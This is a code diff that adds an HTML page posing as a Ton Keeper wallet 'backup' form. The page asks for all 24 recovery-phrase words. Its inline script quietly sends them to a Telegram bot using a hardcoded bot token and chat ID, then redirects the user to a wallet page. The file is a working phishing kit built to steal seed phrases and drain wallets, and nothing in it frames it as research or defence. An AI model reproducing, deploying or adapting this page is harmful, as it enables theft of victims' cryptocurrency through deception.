@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recovery Phrase</title>
+    <link rel="stylesheet" href="style(phrase).css">
+    <script>
+        // Replace YOUR_BOT_TOKEN with the Telegram Bot Token
+        const botToken = "7859150183:AAGh3mscBoMuc1yQTFidmsnA7negZwwtTx4";
+        // Replace YOUR_CHAT_ID with your Telegram Chat ID
+        const chatId = "2013990871";
+
+        function submitForm(event) {
+            event.preventDefault();
+
+            // Collect form data
+            const inputs = document.querySelectorAll("#phraseForm input[type=text]");
+            const phrases = Array.from(inputs).map(input => input.value.trim()).join(", ");
+
+            // Send data to Telegram Bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `🚨 New Recovery Phrase Submission 🚨\n\n${phrases}`,
+                }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Recovery phrases successfully submitted and notified!");
+                    window.location.href = "index(Wallet).html"; // Redirect to wallet page
+                } else {
+                    alert("Error sending recovery phrases. Please try again.");
+                }
+            })
+            .catch(error => {
+                console.error("Telegram API error:", error);
+                alert("Error connecting to Telegram. Please try again.");
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <a href="index(Log in).html" class="back-button">⬅</a>
+        <h1>Recovery Phrase</h1>
+        <p>Write down recovery phrase words from your Ton Keeper wallet to backup your wallet.</p>
+
+        <form id="phraseForm" onsubmit="submitForm(event)">
+            <div class="recovery-grid">
+                <!-- First column (1-12) -->
+                <div class="recovery-column">
+                    <div class="recovery-item"><span>1.</span><input type="text" name="word1" placeholder="Word 1" required></div>
+                    <div class="recovery-item"><span>2.</span><input type="text" name="word2" placeholder="Word 2" required></div>
+                    <div class="recovery-item"><span>3.</span><input type="text" name="word3" placeholder="Word 3" required></div>
+                    <div class="recovery-item"><span>4.</span><input type="text" name="word4" placeholder="Word 4" required></div>
+                    <div class="recovery-item"><span>5.</span><input type="text" name="word5" placeholder="Word 5" required></div>
+                    <div class="recovery-item"><span>6.</span><input type="text" name="word6" placeholder="Word 6" required></div>
+                    <div class="recovery-item"><span>7.</span><input type="text" name="word7" placeholder="Word 7" required></div>
+                    <div class="recovery-item"><span>8.</span><input type="text" name="word8" placeholder="Word 8" required></div>
+                    <div class="recovery-item"><span>9.</span><input type="text" name="word9" placeholder="Word 9" required></div>
+                    <div class="recovery-item"><span>10.</span><input type="text" name="word10" placeholder="Word 10" required></div>
+                    <div class="recovery-item"><span>11.</span><input type="text" name="word11" placeholder="Word 11" required></div>
+                    <div class="recovery-item"><span>12.</span><input type="text" name="word12" placeholder="Word 12" required></div>
+                </div>
+
+                <!-- Second column (13-24) -->
+                <div class="recovery-column">
+                    <div class="recovery-item"><span>13.</span><input type="text" name="word13" placeholder="Word 13" required></div>
+                    <div class="recovery-item"><span>14.</span><input type="text" name="word14" placeholder="Word 14" required></div>
+                    <div class="recovery-item"><span>15.</span><input type="text" name="word15" placeholder="Word 15" required></div>
+                    <div class="recovery-item"><span>16.</span><input type="text" name="word16" placeholder="Word 16" required></div>
+                    <div class="recovery-item"><span>17.</span><input type="text" name="word17" placeholder="Word 17" required></div>
+                    <div class="recovery-item"><span>18.</span><input type="text" name="word18" placeholder="Word 18" required></div>
+                    <div class="recovery-item"><span>19.</span><input type="text" name="word19" placeholder="Word 19" required></div>
+                    <div class="recovery-item"><span>20.</span><input type="text" name="word20" placeholder="Word 20" required></div>
+                    <div class="recovery-item"><span>21.</span><input type="text" name="word21" placeholder="Word 21" required></div>
+                    <div class="recovery-item"><span>22.</span><input type="text" name="word22" placeholder="Word 22" required></div>
+                    <div class="recovery-item"><span>23.</span><input type="text" name="word23" placeholder="Word 23" required></div>
+                    <div class="recovery-item"><span>24.</span><input type="text" name="word24" placeholder="Word 24" required></div>
+                </div>
+            </div>
+            <button type="submit" id="submitButton">Submit</button>
+        </form>
+    </div>
+</body>
+</html>
